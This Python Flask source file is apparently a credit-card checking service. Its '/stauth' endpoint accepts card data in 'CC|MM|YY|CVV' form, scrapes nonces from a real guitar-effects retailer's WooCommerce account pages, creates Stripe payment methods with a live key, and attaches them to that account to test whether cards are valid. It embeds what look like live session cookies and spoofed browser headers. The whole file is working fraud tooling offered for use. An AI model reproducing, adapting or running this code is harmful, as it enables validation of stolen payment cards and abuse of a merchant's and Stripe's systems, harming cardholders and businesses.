from flask import Flask, request, jsonify
import requests
import re
import os
import time

app = Flask(__name__)

# ========== COOKIES FROM ENVIRONMENT VARIABLES ==========
def get_cookies():
    """Get cookies from environment variables"""
    cookies_str = os.environ.get('STRIPE_COOKIES', '')
    
    if cookies_str:
        # Parse cookies from string format: key1=value1; key2=value2
        cookies = {}
        for item in cookies_str.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
        return cookies
    
    # Fallback hardcoded cookies (will expire eventually)
    return {
        'wordpress_sec_6a3ae81458afebc3533a2a615b353027': os.environ.get('WP_SEC', 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7Cc66915f585b0735b582dd6d4cb9c72a865e30f3d6605301a9e9e8550cb4771f5'),
        'wordpress_logged_in_6a3ae81458afebc3533a2a615b353027': os.environ.get('WP_LOGIN', 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7C5a8047ffb8c45d6347731b2ced7afdcc7035bd41c7447849a8a9dffd916f530c'),
        '__stripe_mid': os.environ.get('STRIPE_MID', '11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c'),
        '__stripe_sid': os.environ.get('STRIPE_SID', '89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908'),
    }

HEADERS_PAGE = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US',
    'referer': 'https://www.strymon.net/my-account/payment-methods/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'accept-encoding': 'gzip, deflate, br',
    'connection': 'keep-alive',
    'upgrade-insecure-requests': '1',
}

HEADERS_STRIPE = {
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

HEADERS_AJAX = {
    'accept': '*/*',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.strymon.net',
    'referer': 'https://www.strymon.net/my-account/add-payment-method/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def parse_card_details(card_string):
    """Parse card string in format: CC|MM|YY|CVV"""
    parts = card_string.split('|')
    
    if len(parts) >= 3:
        card_number = parts[0].replace(' ', '').replace('-', '')
        exp_month = parts[1].zfill(2)
        exp_year = parts[2]
        
        if len(exp_year) == 2:
            exp_year = exp_year
        
        cvv = parts[3] if len(parts) >= 4 else '123'
        
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv
        }
    return None

def get_nonces():
    """Extract both nonces from the page with retry"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            cookies = get_cookies()
            
            # Create a session with proper headers
            session = requests.Session()
            session.headers.update(HEADERS_PAGE)
            
            # First get the page to establish session
            response = session.get('https://www.strymon.net/my-account/add-payment-method/', 
                                  cookies=cookies, 
                                  timeout=30)
            
            if response.status_code == 200:
                checkout_nonce_match = re.search(r'"createCheckoutSessionNonce":"([^"]+)"', response.text)
                ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
                
                checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else None
                ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
                
                if ajax_nonce:
                    return checkout_nonce, ajax_nonce
            
            print(f"Attempt {attempt + 1} failed. Status: {response.status_code}")
            time.sleep(2)
            
        except Exception as e:
            print(f"Attempt {attempt + 1} error: {e}")
            time.sleep(2)
    
    return None, None

def create_stripe_payment_method(card_details):
    """Create payment method in Stripe"""
    try:
        stripe_data = f'type=card&card[number]={card_details["number"]}&card[cvc]={card_details["cvv"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=42341&client_attribution_metadata[client_session_id]=c4ebef05-119f-4e09-9180-e99f75dff3ff&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1ETKAW8GsA1&client_attribution_metadata[elements_session_config_id]=3f36629e-3a79-4323-bca5-06c46b3daefb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c&sid=89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR&_stripe_version=2025-09-30.clover'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=HEADERS_STRIPE, 
                                data=stripe_data,
                                timeout=30)
        
        if response.status_code == 200:
            return response.json().get('id')
        else:
            print(f"Stripe error: {response.text}")
        return None
    except Exception as e:
        print(f"Error creating payment method: {e}")
        return None

def attach_payment_method(payment_method_id, ajax_nonce):
    """Attach payment method to WordPress account"""
    try:
        cookies = get_cookies()
        
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response = requests.post('https://www.strymon.net/wp-admin/admin-ajax.php',
                                cookies=cookies,
                                headers=HEADERS_AJAX,
                                data=ajax_data,
                                timeout=30)
        
        return response.json()
    except Exception as e:
        print(f"Error attaching payment method: {e}")
        return {'success': False, 'error': str(e)}

@app.route('/stauth', methods=['GET', 'POST'])
def stauth():
    """Main API endpoint"""
    if request.method == 'GET':
        card_param = request.args.get('cc')
    else:
        card_param = request.form.get('cc')
    
    if not card_param:
        return jsonify({
            'success': False,
            'error': 'Missing card parameter. Use format: ?cc=CC|MM|YY|CVV'
        }), 400
    
    card_details = parse_card_details(card_param)
    if not card_details:
        return jsonify({
            'success': False,
            'error': 'Invalid card format. Use: CC|MM|YY|CVV (e.g., 4400430268343784|02|26|232)'
        }), 400
    
    checkout_nonce, ajax_nonce = get_nonces()
    if not ajax_nonce:
        return jsonify({
            'success': False,
            'error': 'Failed to fetch nonces. Session may be expired. Please update STRIPE_COOKIES environment variable.'
        }), 500
    
    payment_method_id = create_stripe_payment_method(card_details)
    if not payment_method_id:
        return jsonify({
            'success': False,
            'error': 'Failed to create payment method in Stripe. Card may be invalid.'
        }), 400
    
    result = attach_payment_method(payment_method_id, ajax_nonce)
    
    return jsonify({
        'success': result.get('success', False),
        'payment_method_id': payment_method_id,
        'response': result,
        'card_details': {
            'last4': card_details['number'][-4:],
            'expiry': f"{card_details['exp_month']}/{card_details['exp_year']}"
        }
    })

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'cookies_loaded': bool(get_cookies())})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
